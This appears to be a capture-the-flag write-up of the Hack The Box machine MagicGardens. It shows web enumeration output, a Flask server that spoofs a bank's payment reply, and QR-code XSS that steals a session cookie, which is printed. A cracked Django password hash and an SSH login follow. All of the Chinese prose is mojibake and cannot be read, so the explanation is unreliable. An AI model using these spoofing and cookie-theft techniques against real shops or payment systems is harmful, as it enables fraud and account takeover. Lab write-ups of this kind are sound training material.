<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/login =&gt; http://magicgardens.htb/login/</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/search =&gt; http://magicgardens.htb/search/</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/register =&gt; http://magicgardens.htb/register/</span><br><span class="line">200      GET       36l      234w    16516c http://magicgardens.htb/static/store/logo.png</span><br><span class="line">200      GET      112l      199w    14103c http://magicgardens.htb/static/store/star.png</span><br><span class="line">200      GET       15l       73w     5934c http://magicgardens.htb/static/store/twitter.png</span><br><span class="line">200      GET       14l       80w     4316c http://magicgardens.htb/static/store/facebook.png</span><br><span class="line">200      GET       16l      128w     7376c http://magicgardens.htb/static/store/cart_dark.png</span><br><span class="line">200      GET      157l      611w     9042c http://magicgardens.htb/catalog/Rose</span><br><span class="line">200      GET      147l      572w     8604c http://magicgardens.htb/catalog/Chrysanthemum</span><br><span class="line">200      GET        9l       68w     5087c http://magicgardens.htb/static/store/youtube.png</span><br><span class="line">200      GET       17l      113w     7571c http://magicgardens.htb/static/store/instagram.png</span><br><span class="line">200      GET      161l      616w     9222c http://magicgardens.htb/catalog/Carnation</span><br><span class="line">200      GET      151l      654w     9132c http://magicgardens.htb/catalog/Tulip</span><br><span class="line">200      GET      126l      541w     7382c http://magicgardens.htb/catalog/Lilium</span><br><span class="line">200      GET       17l      219w    16221c http://magicgardens.htb/static/store/cart.png</span><br><span class="line">200      GET      143l      575w     8420c http://magicgardens.htb/catalog/Gerbera</span><br><span class="line">200      GET      151l      621w     8911c http://magicgardens.htb/catalog/Orchid</span><br><span class="line">200      GET      140l      588w     8139c http://magicgardens.htb/catalog/Snowdrop</span><br><span class="line">200      GET      122l      519w     7112c http://magicgardens.htb/catalog/Iris</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/profile =&gt; http://magicgardens.htb/profile/</span><br><span class="line">200      GET      156l      479w    35302c http://magicgardens.htb/static/store/catalog.png</span><br><span class="line">200      GET      163l      651w    48532c http://magicgardens.htb/static/store/favicon.png</span><br><span class="line">200      GET      139l      325w    21887c http://magicgardens.htb/static/store/login.png</span><br><span class="line">200      GET      150l      456w    30261c http://magicgardens.htb/static/store/heart.png</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/subscribe =&gt; http://magicgardens.htb/subscribe/</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/cart =&gt; http://magicgardens.htb/cart/</span><br><span class="line">403      GET        7l        9w      153c http://magicgardens.htb/media/uploads/</span><br><span class="line">403      GET        7l        9w      153c http://magicgardens.htb/static/store/</span><br><span class="line">200      GET     1385l     7878w   615881c http://magicgardens.htb/media/uploads/gerbera.jpg</span><br><span class="line">200      GET      853l     5257w   330945c http://magicgardens.htb/media/uploads/lilium.jpg</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/wish_list =&gt; http://magicgardens.htb/wish_list/</span><br><span class="line">403      GET        7l        9w      153c http://magicgardens.htb/static/</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/catalog =&gt; http://magicgardens.htb/catalog/</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/admin =&gt; http://magicgardens.htb/admin/</span><br><span class="line">200      GET     1091l     7314w   577616c http://magicgardens.htb/media/uploads/iris.jpg</span><br><span class="line">403      GET        7l        9w      153c http://magicgardens.htb/media/</span><br><span class="line">200      GET     2336l    13564w  1082094c http://magicgardens.htb/static/store/promo.jpg</span><br><span class="line">200      GET     1816l    11145w   869024c http://magicgardens.htb/media/uploads/tulip.jpg</span><br><span class="line">200      GET     1048l     6639w   459217c http://magicgardens.htb/media/uploads/snowdrop.jpg</span><br><span class="line">200      GET        0l        0w   255080c http://magicgardens.htb/media/uploads/orchid.jpg</span><br><span class="line">200      GET        0l        0w   518517c http://magicgardens.htb/media/uploads/%D1%81hrysanthemum.jpg</span><br><span class="line">200      GET        0l        0w   498589c http://magicgardens.htb/media/uploads/rose.jpg</span><br><span class="line">200      GET        0l        0w   398855c http://magicgardens.htb/media/uploads/carnations.jpg</span><br><span class="line">200      GET        0l        0w   280602c http://magicgardens.htb/static/store/bootstrap.css</span><br><span class="line">200      GET        0l        0w   290998c http://magicgardens.htb/static/store/promo_2.png</span><br><span class="line">200      GET      458l     1853w    30861c http://magicgardens.htb/</span><br><span class="line">301      GET        7l       11w      169c http://magicgardens.htb/static/store =&gt; http://magicgardens.htb/static/store/</span><br><span class="line">301      GET        7l       11w      169c http://magicgardens.htb/media/uploads =&gt; http://magicgardens.htb/media/uploads/</span><br><span class="line">301      GET        7l       11w      169c http://magicgardens.htb/static/admin =&gt; http://magicgardens.htb/static/admin/</span><br><span class="line">301      GET        7l       11w      169c http://magicgardens.htb/static/admin/img =&gt; http://magicgardens.htb/static/admin/img/</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="å°è¯•-æœªç™»å½•çŠ¶æ€ä¸‹"><a href="#å°è¯•-æœªç™»å½•çŠ¶æ€ä¸‹" class="headerlink" title="å°è¯•-æœªç™»å½•çŠ¶æ€ä¸‹"></a>å°è¯•-æœªç™»å½•çŠ¶æ€ä¸‹</h2><p><img src="/wpimages/2024/magicgardens/web1.jpg" alt="web1"></p>
<p>çœ‹åˆ°è¿™é‡Œæˆ‘å¯ä»¥å¡«å†™åœ°å€å•¥çš„ç›´æ¥ä¸€ä¸ªxssï¼Œä½†æ˜¯æ²¡æœ‰è¿”å›ï¼Œä¸è¿‡è¿™ä¸ªç›®å‰æˆ‘è¿˜æ²¡ç™»é™†çš„çŠ¶æ€ä¸‹æ˜¯è¿™æ ·çš„ï¼Œç­‰ä¸€ä¼šç™»å½•å†è¯•è¯•ã€‚</p>
<p><img src="/wpimages/2024/magicgardens/web2.jpg" alt="web2"></p>
<p>è¿™é‡Œæäº¤è®¢å•åæœ‰æ˜¾ç¤ºæäº¤æˆåŠŸï¼Œå…¶ä¸­æåˆ° </p>
<blockquote>
<p><em>24å°æ—¶å†…ä¼šæœ‰ä»–ä»¬ç»ç†å’Œæˆ‘è”ç³»ï¼Œå¹¶ä¸”å‡ºç¤ºQRç ä¼šæœ‰ä¼˜æƒ </em></p>
</blockquote>
<p>è¿™é‡Œæˆ‘è€ƒè™‘åˆ°ä¼šè”ç³»æˆ‘åº”è¯¥æœ‰ä¸¤ç§å¯èƒ½ï¼š</p>
<ul>
<li>1.ç™»é™†åæœ‰è”ç³»æ¸ é“</li>
<li>2.ç›´æ¥ç»™æˆ‘é‚®ç®±æœåŠ¡å™¨å‘é‚®ä»¶</li>
</ul>
<p>ç”±äºæˆ‘ç€å®æ²¡æƒ³åˆ°æˆ‘é™¤äº†åŠ«æŒä»–dnsè§£æä¹‹å¤–ä»–æ€ä¹ˆç»™æˆ‘å‘é‚®ä»¶ï¼Œæ‰€ä»¥ä¸€ä¼šç™»å½•å†æµ‹æµ‹è¿™ä¸ªåŠŸèƒ½ã€‚</p>
<hr>
<p>å†çœ‹çœ‹æœ‰æ²¡æœ‰sqlæ³¨å…¥</p>
<p><img src="/wpimages/2024/magicgardens/web3.jpg" alt="web3"></p>
<p>è¿™é‡Œè¯•äº†ä¸‹æ²¡æœ‰</p>
<hr>
<p><img src="/wpimages/2024/magicgardens/web5.jpg" alt="web5"></p>
<p>çœ‹äº†ä¸‹èƒ½ä¸èƒ½é€šè¿‡é‡ç½®å¯†ç çˆ†ç ´å‡ºç”¨æˆ·..å‘ç°å…¨æ˜¯200æ‰€ä»¥è¿™ä¸ªpass</p>
<hr>
<p><img src="/wpimages/2024/magicgardens/web7.jpg" alt="web5"></p>
<p>ç„¶åæ˜¯æˆ‘å½“æ—¶æšä¸¾çš„æ—¶å€™ï¼Œå‘ç°å®ƒæœ‰è´¦å·æ³¨å†Œçš„åœ°æ–¹ï¼Œå°±è€ƒè™‘æ³¨å†Œç”¨æˆ·éå†ï¼Œå½“æ—¶æ˜¯è·‘å‡ºæ¥ç›®æ ‡ç”¨æˆ·åäº†ï¼Œä¸è¿‡å½“æ—¶æˆ‘æ‹¿ç€ä¹Ÿæ²¡å•¥é¸Ÿç”¨..</p>
<hr>
<h3 id="æœ‰å‘çš„åœ°æ–¹"><a href="#æœ‰å‘çš„åœ°æ–¹" class="headerlink" title="æœ‰å‘çš„åœ°æ–¹"></a>æœ‰å‘çš„åœ°æ–¹</h3><p><img src="/wpimages/2024/magicgardens/web4.jpg" alt="web4"></p>
<p>è¿™ä¸ªæˆ‘æƒ³éšä¾¿æ„é€ ä¸ªå‚åˆ°è´­ç‰©è½¦ï¼ŒåŠ å®Œä¹‹åè´­ç‰©è½¦ï¼Œè®¿é—®è´­ç‰©è½¦ç›´æ¥error 500,è¦reæœºå™¨æ‰è¡Œ..ï¼ˆæ·»åŠ æ”¶è—ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œä¸è¦è½»æ˜“å°è¯•ï¼‰</p>
<hr>
<h2 id="å°è¯•-ç™»å½•çŠ¶æ€ä¸‹"><a href="#å°è¯•-ç™»å½•çŠ¶æ€ä¸‹" class="headerlink" title="å°è¯•-ç™»å½•çŠ¶æ€ä¸‹"></a>å°è¯•-ç™»å½•çŠ¶æ€ä¸‹</h2><p><img src="/wpimages/2024/magicgardens/web9.jpg" alt="web9"></p>
<p><img src="/wpimages/2024/magicgardens/web10.jpg" alt="web10"></p>
<p>è¿™æ³¢ç™»å½•ä¹‹åå°è¯•äº†ä¸‹è¿™ä¸ªè´­ä¹°åŠŸèƒ½è¿˜æ˜¯æ²¡æœ‰xssï¼Œç„¶åæˆ‘çœ‹è¯´æ˜¯ä¹°20ä¸ªå…è¿è´¹ï¼Œç„¶ååˆä¹°äº†20ä¸ªè¿˜æ˜¯ä¸è¡Œï¼Œæ‰€ä»¥æœ€ç»ˆè¿™ä¸ªéƒ¨åˆ†passäº†</p>
<hr>
<p><img src="/wpimages/2024/magicgardens/web11.jpg" alt="web11"></p>
<p>è¿™éƒ¨åˆ†æˆ‘å°è¯•äº†ä¸‹xssä¹Ÿæ˜¯ä¸è¡Œï¼Œä¸Šä¼ ä¹Ÿæ˜¯g</p>
<hr>
<p><img src="/wpimages/2024/magicgardens/web12.jpg" alt="web12"></p>
<p>å†æ‰¾åˆ°è¿™ä¸ªè´¦æˆ·å‡çº§çš„é¡µé¢ï¼Œä½†æ˜¯è¦æ‰£é’±ï¼Œæœ€ä¸»è¦çš„æ˜¯è¿˜ä¸€ç›´æ˜¯å¤±è´¥</p>
<p><img src="/wpimages/2024/magicgardens/web13.jpg" alt="web13"></p>
<p>ä¸è¿‡æˆ‘çœ‹åˆ°ä»–æ˜¯æœ‰è¯·æ±‚åˆ°è¿™ä¸‰ä¸ªé“¶è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘è§‰å¾—å¯èƒ½ä»–ä¼šå­˜åœ¨é“¶è¡Œçš„servernameæˆ–è€…åˆ«çš„æ¥å£ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œä¼˜å…ˆæŠŠè¿™ä¸‰ä¸ªé“¶è¡ŒåŸŸåæ·»åŠ åˆ°hostç„¶åè¿›è¡Œdirçˆ†ç ´ã€‚</p>
<p>ç„¶åå‘ç°ç¡®å®æ˜¯å­˜åœ¨çš„</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ feroxbuster -u http://magicalbank.htb/api -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -d 3</span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher ğŸ¤“                 ver: 2.10.1</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> ğŸ¯  Target Url            â”‚ http://magicalbank.htb/api</span><br><span class="line"> ğŸš€  Threads               â”‚ 50</span><br><span class="line"> ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt</span><br><span class="line"> ğŸ‘Œ  Status Codes          â”‚ All Status Codes!</span><br><span class="line"> ğŸ’¥  Timeout (secs)        â”‚ 7</span><br><span class="line"> ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.10.1</span><br><span class="line"> ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> ğŸ”  Extract Links         â”‚ <span class="literal">true</span></span><br><span class="line"> ğŸ  HTTP methods          â”‚ [GET]</span><br><span class="line"> ğŸ”ƒ  Recursion Depth       â”‚ 3</span><br><span class="line"> ğŸ‰  New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latest</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">404      GET       10l       21w      179c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">301      GET        0l        0w        0c http://magicalbank.htb/api/sessions =&gt; http://magicalbank.htb/api/sessions/</span><br><span class="line">301      GET        0l        0w        0c http://magicalbank.htb/api/createAccount =&gt; http://magicalbank.htb/api/createAccount/</span><br><span class="line">301      GET        0l        0w        0c http://magicalbank.htb/api/payments =&gt; http://magicalbank.htb/api/payments/</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯¹ç€å‡ ä¸ªæ¥å£è¿›è¡Œäº†è®¿é—®</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ curl http://magicalbank.htb/api/createAccount/ -XPOST</span><br><span class="line">&#123;<span class="string">&quot;accountCode&quot;</span>: <span class="string">&quot;9125649562&quot;</span>, <span class="string">&quot;pspReference&quot;</span>: <span class="string">&quot;UD8DPQ6qQ0UK2&quot;</span>&#125;  </span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªæ¥å£æˆ‘æ²¡çœ‹æ‡‚æ˜¯å¹²å•¥çš„ï¼Œæˆ‘å¯»æ€æ˜¯è¦æ‹¿ç€è¿™ä¸ªå¡cookiesé‡Œï¼Œç„¶åå»è®¿é—®é“¶è¡Œ..è¯•äº†åŠå¤©å¹¶ä¸æ˜¯ã€‚</p>
<p><img src="/wpimages/2024/magicgardens/web14.jpg" alt="web14"></p>
<p>è¿™ä½æ›´æ˜¯é€†å¤©ï¼Œç›´åˆ°æˆ‘å†™wpæ—¶éƒ½æ²¡ææ˜ç™½è¿™ä¸ªsessionæ¥å£æ˜¯å¹²å•¥çš„ã€‚</p>
<hr>
<p><img src="/wpimages/2024/magicgardens/web15.jpg" alt="web15"></p>
<p>ç„¶åæˆ‘è¯•äº†ä¸‹æ˜¯ä¸æ˜¯å­˜åœ¨ssrfè¿˜æ˜¯å•¥çš„ï¼Œå‘ç°æœ‰è¹Šè··ï¼Œè¿™é‡Œæˆ‘ç»™äº†ä¸ª127.0.0.1ä»–ç›´æ¥ç»™æŠ¥é”™äº†ï¼Œå¦‚æœæ˜¯è¿æ¥çš„é“¶è¡Œçš„è¯ä¼šæ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­</p>
<p><img src="/wpimages/2024/magicgardens/web16.jpg" alt="web16"></p>
<p>è½¬åŠå¤©æ‰ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘çŒœæµ‹ä»–å¯èƒ½æ˜¯éœ€è¦è®¿é—®åˆ°æ¥å£æ‰å¯ä»¥ï¼Œæ‰€ä»¥ä»–æ­£å¸¸æ˜¯è®¿é—®åˆ°äº†bankçš„apiçš„ï¼Œä¼°è®¡æ˜¯å‡ºäº†å•¥é—®é¢˜ï¼Œæ‰€ä»¥å½“æ—¶ç”¨mitmweb å¼€äº†ä¸ªç›‘å¬ç„¶åæŠŠè½¬å‘ç«™ç‚¹æ”¹æˆäº†magicalbank.htbï¼Œè¿›è¡Œä¸€ä¸ªçœ‹ä»–ä¿©ç«™ç‚¹äº¤äº’æ—¶å€™åˆ°åº•å‘ç”Ÿäº†ç¥é­”äº‹ã€‚</p>
<p><img src="/wpimages/2024/magicgardens/web17.jpg" alt="web17"></p>
<p>èŠå£«å•†åŸçš„è¯·æ±‚</p>
<p><img src="/wpimages/2024/magicgardens/web18.jpg" alt="web18"></p>
<p>èŠå£«bankçš„è¿”å›</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;cardname&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cardnumber&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">    <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Payment Required&quot;</span>,</span><br><span class="line">    <span class="string">&quot;status&quot;</span>: <span class="string">&quot;402&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘å½“æ—¶ä»¥ä¸ºæ˜¯é“¶è¡Œæ²¡é’±å¯¼è‡´çš„ï¼Œæ‰€ä»¥æ”¹äº†ä¸€ä¸‹è¯·æ±‚çš„é’±æ•°umountï¼Œbankè¿”å›è¿˜æ˜¯402ã€‚è€ƒè™‘åˆ°è¿™ä¸ªåº”è¯¥æ˜¯æœ‰é—®é¢˜ï¼Œæ‰€ä»¥å°è¯•æ¢ä¸ªæ–¹å‘æ€è€ƒï¼Œæ˜¯ä¸æ˜¯éªŒè¯ç”±å•†åŸé‚£è¾¹åšçš„ï¼Œæ˜¯å¯¹bankå“ªä¸ªè¿”å›å€¼åšå‡ºäº†åˆ¤æ–­è¿˜æ˜¯æœ‰è¿›ä¸€æ­¥çš„è”åŠ¨æ ¡éªŒã€‚</p>
<p>..æ‰€ä»¥å†™ä¸ªäº†å‡è¿”å›ç®€å•è¯•äº†ä¸‹ï¼Œä¸€å¼€å§‹æˆ‘ç»™çš„æ˜¯è®¿é—®ä¼šè¿”å›<code>status 200</code>ï¼Œè¯•äº†ä¸‹æ²¡å•¥ååº”ï¼Œç„¶ååˆæ”¹äº†æ”¹åŠ äº†é“¶è¡Œæµ‹è¿”å›çš„<code>json</code>é‡Œ<code>status</code>çš„å€¼å’Œåˆ«çš„å‡ ä¸ªkeyï¼Œå‘ç°æ”¹äº†<code>status</code>æˆäº†ã€‚å–œævip</p>
<p>è¿™æ˜¯è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">catch_all</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;status&quot;: &quot;200&quot;, &quot;message&quot;: &quot;Payment Required&quot;, &quot;cardname&quot;: &quot;123&quot;, &quot;cardnumber&quot;: &quot;aa&quot;&#125;&#x27;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">3000</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2024/magicgardens/web19.jpg" alt="web19"></p>
<p>get QR</p>
<hr>
<h3 id="å‘ç‚¹"><a href="#å‘ç‚¹" class="headerlink" title="å‘ç‚¹"></a>å‘ç‚¹</h3><p>è¿™é‡Œåƒä¸‡è¿”å›æ¶ˆæ¯è¦ç»™å…¨äº†ï¼Œä»–å¥½åƒæ˜¯ä¼šåŒ¹é…å››ä¸ªkeyï¼Œå…¨æœ‰æ‰è¡Œï¼Œæˆ‘æ‰‹è´±messageå»æ‰äº†ï¼Œç›´æ¥è´¦æˆ·å¡è¿™ä¸ªé¡µé¢äº†ã€‚</p>
<p><em>è¿™é‡Œæˆ‘ç•™äº†ä¸ªå°å‘å’¦å˜»å˜»ã€‚</em></p>
<hr>
<p>è¿™é‡Œæˆ‘å·²ç»æ˜¯å¤§ä¼šå‘˜äº†ï¼Œè´­ä¹°æ—¶å€™å°è¯•ä¸€ä¸‹ä¿¡æ¯é‡Œç»™xssï¼Œè¯•äº†ä¸‹è¿˜æ˜¯ä¸è¡Œã€‚</p>
<p>ä¸è¿‡æ‹¿åˆ°QRä¹‹åå†å°è¯•ä¹°ä¸œè¥¿å°±ä¼šæœ‰äººè”ç³»äº†ï¼Œ</p>
<p><img src="/wpimages/2024/magicgardens/web20.jpg" alt="web20"></p>
<p>è¿™é‡Œæˆ‘å¡äº†å¾ˆé•¿æ—¶é—´ï¼Œxssç›´æ¥ä¸¢è¿‡å»æ˜¯ä¸è¡Œçš„ã€‚æœ€åæœ‹å‹æé†’äº†ä¸€ä¸‹æ˜¯å› ä¸ºå¯¹é¢é‚£éœ€è¦æ‰«äºŒç»´ç ï¼Œæ‰€ä»¥æ˜¯äºŒç»´ç å¯ä»¥åšxssã€‚</p>
<p><img src="/wpimages/2024/magicgardens/web21.jpg" alt="web21"></p>
<p>æŒ‰ç…§è¿™ä¸ªæ€è·¯æˆ‘å‘ç°downloadæ—¶å€™å¥½åƒå¯ä»¥ç”¨ä»–çš„base64è‡ªå®šä¹‰äºŒç»´ç å†…å®¹..ä¸è¿‡ç»™xssçš„è¯­å¥å‡ºæ¥çš„äºŒç»´ç ï¼Œæ‰«æ—¶å€™å‘ç°ä¼šè¢«è¿‡æ»¤æ‰ã€‚</p>
<p>æ²¡åŠæ³•å°±è¿˜æ˜¯å»æ‰¾äº†ä¸ªç”Ÿæˆçš„ï¼š</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://cli.im/text/other">https://cli.im/text/other</a></p>
<p><a target="_blank" rel="noopener" href="https://www.the-qrcode-generator.com/">https://www.the-qrcode-generator.com/</a></p>
</blockquote>
<p>è¿™ä¿©éƒ½æˆ</p>
<p>ç„¶åå‘ç»™å¯¹é¢ç­‰äº†åŠå¤©å°±å–œæcookiesäº†</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?c=csrftoken=TQfakXOEyOcqpaUwwnu4JTwHdlCyBxwc;%20sessionid=.eJxNjU1qwzAQhZNFQgMphZyi3QhLluNoV7rvqgcwkixFbhMJ9EPpotADzHJ63zpuAp7d977Hm5_V7265mO4bH-GuJBO9PBuE1TnE_IWwTlnmksbgLUtrETafQ3LdaUgZYYGwnVCH4rOJ6Naw0TLmfz_SdqKZvu9kya67POqGHmHJEHazTEn9Yfwonvp36Y-B6OBzHBS5VMjVJvIaenN6uXUfZgNOJofwTBttmW0FrU3VcGbMgWlRKcWptIIy2Ryqfa1t0-o9VYqpyrCaG061amuuhcBC_gDes2X7:1sBrZf:Hfxfpt7QMKfaGCzyy_Xg0tM8OGgFXonT_TYGAQeTtpg</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="LOGIN-morty"><a href="#LOGIN-morty" class="headerlink" title="LOGIN morty"></a>LOGIN morty</h2><p><img src="/wpimages/2024/magicgardens/web22.jpg" alt="web22"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯ç™»é™†åˆ°äº†mortyè¿™ä¸ªç”¨æˆ·çš„ï¼ˆè¿™é‡Œå¼±æ™ºäº†ï¼Œåº”è¯¥å»ç™»å½•djangoçš„ï¼Œåœ¨è¿™åˆè¯•äº†åŠå¤©å•†åŸï¼‰</p>
<p>ç„¶åå»ç™»é™†ä¸€ä¸‹djangoï¼Œåœ¨ä¸€é¡¿ä¹±ç‚¹ä¹‹ä¸‹å‘ç°äº†ä¸ªhashï¼Œæˆ‘è¿˜ä»¥ä¸ºè¦ä¸Šcveæ¥ç€..</p>
<p><img src="/wpimages/2024/magicgardens/web23.jpg" alt="web23"></p>
<p>hashcat è·‘äº†ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j<span class="variable">$e7bq8dE</span>/U+yIiZ8isA0Dc0wuL0gYI3GjmmdzNU+Nl7I=:jonasbrothers</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="SSH-morty"><a href="#SSH-morty" class="headerlink" title="SSH morty"></a>SSH morty</h3><p>æ²¡æƒ³åˆ°sshç›´æ¥è¿›æ¥äº†..</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ssh morty@10.10.11.9                         </span><br><span class="line">morty@10.10.11.9<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux magicgardens 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">morty@magicgardens:~$ ls</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç®€å•æ”¶é›†äº†ä¸€ä¸‹ä¸»æœºä¿¡æ¯ï¼Œè¿™éƒ¨åˆ†æ²¡å•¥ç‰¹åˆ«é‡è¦çš„ä¸œè¥¿ã€‚</p>
<p>å¿«è¿›åˆ°psçœ‹åˆ°alexçš„è¿›ç¨‹ï¼Œè„±ä¸‹æ¥harvestç›´æ¥å¼€pwnã€‚</p>
